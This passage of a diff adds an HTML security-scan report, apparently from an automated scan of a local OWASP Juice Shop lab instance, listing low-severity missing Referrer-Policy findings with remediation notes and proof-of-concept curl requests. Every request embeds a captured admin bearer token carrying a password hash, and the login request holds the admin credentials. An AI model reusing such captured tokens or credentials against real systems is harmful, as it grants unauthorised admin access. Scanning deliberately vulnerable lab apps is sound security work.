+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/products/1/reviews \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Referrer) — http://localhost:3000/rest/saveLoginIp<br><small>high confidence</small></td><td>Missing Referrer-Policy header.<br><code>curl \
+  http://localhost:3000/rest/saveLoginIp \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/saveLoginIp \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Referrer) — http://localhost:3000/rest/user/login<br><small>high confidence</small></td><td>Missing Referrer-Policy header.<br><code>curl \
+  -X POST \
+  http://localhost:3000/rest/user/login \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27; \
+  --data-raw &#x27;{&quot;email&quot;: &quot;admin@juice-sh.op&quot;, &quot;password&quot;: &quot;admin123&quot;}&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  -X POST \
+  http://localhost:3000/rest/user/login \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27; \
+  --data-raw &#x27;{&quot;email&quot;: &quot;admin@juice-sh.op&quot;, &quot;password&quot;: &quot;admin123&quot;}&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Referrer) — http://localhost:3000/rest/user/whoami<br><small>high confidence</small></td><td>Missing Referrer-Policy header.<br><code>curl \
+  http://localhost:3000/rest/user/whoami \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/user/whoami \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr></tbody></table>
+  </section>
+</main>
+</body>
+</html>
